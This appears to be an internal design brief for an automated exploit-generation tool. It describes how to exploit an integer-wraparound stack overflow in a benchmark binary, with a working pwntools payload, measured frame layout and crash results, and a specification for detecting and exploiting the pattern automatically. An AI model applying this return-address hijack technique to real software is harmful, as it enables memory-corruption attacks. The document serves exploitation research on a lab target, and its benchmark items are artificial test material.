# G-23 — `loop_counter_overflow`: implementation brief — 2026-09-28

Everything in the "Measured" sections below was run by me on this host today
against `benchmark/corpus_r2/08_int_mul_overflow`. Nothing here is inferred from
reading the source alone. Work-queue row 55 carries the same findings in prose.

## The gap in one sentence

A bounded copy loop keeps its own induction variable and bound *inside the
overflow's reach*, so overflowing the buffer destroys the loop that is
delivering the payload — and the program then **exits 0 with no crash**, which
every current executor reads as "not vulnerable".

## Measured: the target, and why every existing technique misses it

`benchmark/corpus_r2/08_int_mul_overflow` is solved by nothing in the ladder.
The size check wraps in 8-bit arithmetic:

```c
unsigned char total_bytes = (unsigned char)(len * 8);
if (total_bytes > sizeof(buf)) { puts("too many records"); return; }
for (i = 0; i < (int)len; i++) read(0, buf + i * 8, 8);
```

`len = 32` makes `(unsigned char)(32*8) == 0`, passing a check against 64 while
the loop still performs 32 × 8 = 256 bytes of writes into a 64-byte buffer.

The frame, read off `objdump -d -M intel` (measured):

| location | `rbp`-relative | position from `buf` start |
|---|---|---|
| `buf` (64 bytes) | `rbp-0x50` | 0 |
| — unused gap — | `rbp-0x10 .. rbp-0x9` | 64–71 |
| `total_bytes` (`u8`) | `rbp-0x6` | 74 |
| `len` (`u8`, the loop bound) | `rbp-0x5` | 75 |
| `i` (`int`, induction variable) | `rbp-0x4` | 76 |
| saved `rbp` | `rbp+0x0` | 80 |
| **return address** | `rbp+0x8` | **88** |

The loop re-reads *both* from memory every iteration:

```asm
4013e4:  add    DWORD PTR [rbp-0x4],0x1        ; i++
4013e8:  movzx  eax,BYTE PTR [rbp-0x5]         ; reload len
4013ec:  cmp    DWORD PTR [rbp-0x4],eax
4013ef:  jl     4013c3                          ; loop
```

With stride 8, record `r` writes positions `8r .. 8r+7`:

- `r = 9` → 72–79 → lands on `total_bytes`, `len`, **and all four bytes of `i`**
- `r = 10` → 80–87 → saved `rbp`
- `r = 11` → 88–95 → **return address**

So a naive overflow's 10th record garbles `i` and `len`; the reloaded bound then
fails and the loop exits before record 11 ever runs.

**Measured failure signature — this is the part worth remembering.**
`cyclic(256, n=8)` after a `32\n` count produces:

```
=== r2-08 int-mul-overflow ===
records (0-8, 8 bytes each): loading 32 records...
loaded
done
```

…and **exit code 0**. No crash, no truncated output, no hint. A harness that
classifies on "did it crash?" sees a clean, non-vulnerable program.

## Measured: the working recipe

```python
rec9    = b'AA' + p8(0) + p8(32) + p32(9)   # pad,pad | total_bytes | len=32 | i=9
payload = b'A'*72 + rec9 + b'B'*8 + p64(ret_gadget) + p64(win)
io.send(b"32\n"); io.send(payload); io.shutdown('send')
```

Result: `rc=0`, flag-shaped output, 129 bytes. Two things make it work:

1. **Record 9 is a control record, not padding.** It sets `len = 32` and
   `i = 9`; the trailing `add DWORD PTR [rbp-0x4],1` carries `i` to 10, so the
   loop survives to write records 10 (saved `rbp`) and 11 (return address).
2. **A `ret` slide fixes stack alignment.** Returning *into* `win` leaves RSP
   16-aligned where a `call` would leave it 8-mod-16, so glibc's `movaps` inside
   `fopen`/`fgets` faults.

**Measured alignment evidence, and a second reading worth keeping:**

| `i` written | `len` written | result |
|---|---|---|
| 9 | 32 | `rc=-11` (SIGSEGV) |
| 9 | 64 | `rc=-11` |
| 10 | 32 | `rc=-11` |
| 10 | 64 | `rc=-11` |
| 8 | 32 / 64 | `rc=0`, no diversion |

A SIGSEGV here means the technique **worked** and only the epilogue failed. An
executor that treats SIGSEGV as failure will throw away its own successes; it
has to try the `ret` slide before concluding anything. `i = 8` is the control
that proves the diversion is real and not incidental — it is one record short of
reaching `i`, and it produces a clean exit.

EOF after the last record is fine: `read` returns 0, the loop spins out to `len`
without writing, and the epilogue runs.

**The alignment half is already implemented** and was checked before being
claimed missing: `supwngo/exploit/pipeline/executors/rop_techniques.py:248-254`
already sweeps both stack parities for precisely this `movaps` reason. Only the
induction-variable rewrite is genuinely absent. Do not rebuild the slide.

## The gate — a statement about the frame, not the bug class

`is_applicable` must open on this shape without reading a filename or slug:

1. A `read`/`recv`/`memcpy`/`fread` call inside a loop (a backward branch to an
   address at or before the call).
2. Its destination is computed as `base + i*stride`: a `lea r,[rbp-BUF]` plus a
   scaled load of an `int` stack local (`mov eax,[rbp-I]; shl eax,K` or an
   `imul`/`lea` scale). Record `BUF`, `I`, and `stride = 1<<K`.
3. The loop condition **re-reads the bound from memory each iteration** and the
   bound is a *narrow* local: `movzx eax, BYTE/WORD PTR [rbp-L]` followed by
   `cmp DWORD PTR [rbp-I], eax`. Record `L`.
4. **The discriminator:** `I < BUF` and `L < BUF` — the induction variable and
   the bound sit numerically closer to `rbp` than the buffer base does, i.e.
   they are *inside* the region the overflow crosses. If they are outside it,
   this is an ordinary stack overflow and `ret2win` already owns it; decline.

Condition 4 is the fact the plan builder must refuse to proceed without. It is
what separates this from every existing stack technique, and it is computable
from the disassembly alone.

## Derivation the executor performs (all arithmetic, no guessing)

```
pos(x)      = BUF - x                    # byte position relative to buf start
r_ctrl      = pos(I) // stride           # record that covers the induction variable
r_ret       = (BUF + 8) // stride        # record that covers the return address
i_in_rec    = pos(I) % stride            # where i sits inside the control record
len_in_rec  = pos(L) % stride
```

The control record is `stride` bytes of filler with `p32(r_ctrl)` at `i_in_rec`
and the chosen bound byte at `len_in_rec`. The payload is
`filler(r_ctrl*stride) + ctrl + filler((r_ret-r_ctrl-1)*stride) + tail`, where
`tail` is `p64(win)` or `p64(ret) + p64(win)` — **try both parities**.

Assert `r_ctrl < r_ret` and that `pos(I) + 4 <= (r_ctrl+1)*stride` (the induction
variable does not straddle two records); decline if either fails rather than
emitting a payload that cannot work.

## Brute force that is allowed here

The initial count must satisfy `(count * stride) & 0xFF <= buf_capacity` while
still exceeding `r_ret + 2`. Read `buf_capacity` from the `cmp BYTE PTR [rbp-?],
IMM` immediate when it is present; otherwise sweep
`count ∈ {32, 64, 96, 128, 160, 192, 224, 16, 48, 255}`. The bound byte written
into the control record is swept over the same set. Retry-based search is
explicitly in scope for this loop — prefer a sweep that terminates over a clever
derivation that is fragile.

## Done criteria (unchanged from the standing rule)

1. `benchmark/corpus_g23/` — five positives holding the program's shape constant
   and varying only the mechanism, plus one negative control whose slug contains
   `_9` (that substring is what `benchmark/measure_family.py` reads).
   All six built with byte-identical cflags.
2. Each positive **proven solved** with `verified` set; the control **proven not
   solved**. A crash is not a solve — and per the table above, a SIGSEGV here is
   specifically *not* a failure either, so the executor must not stop at one.
3. `python3 scripts/gate_sweep.py <module> <ExecutorClass> corpus_g23` over the
   whole benchmark tree, with every out-of-family open named.
4. **`benchmark/corpus_r2/08_int_mul_overflow` solves.** This is the item's
   reason for existing: a target recorded as solved by nothing, closed by a
   technique rather than by a corpus edit.

Suggested variants, all keeping the count-prompt-then-records shape and varying
only where the loop keeps its state: bound and index adjacent above the buffer
(the r2-08 shape); index below the buffer and bound above it; a 16-bit bound; a
stride of 16; and a loop that recomputes its limit from a *second* narrow local
so two fields must be rewritten. The negative control keeps the wrapping size
check but hoists `i` and `len` into registers (`register int i;` plus `-O1`) so
nothing the overflow crosses is load-bearing — statically similar, genuinely
unexploitable by this route.

## Ordering seat

Do **not** add an entry to `FIRST_TECHNIQUES`. Seating is decided from a
measured before/after on full-ladder wall time, and is done separately.
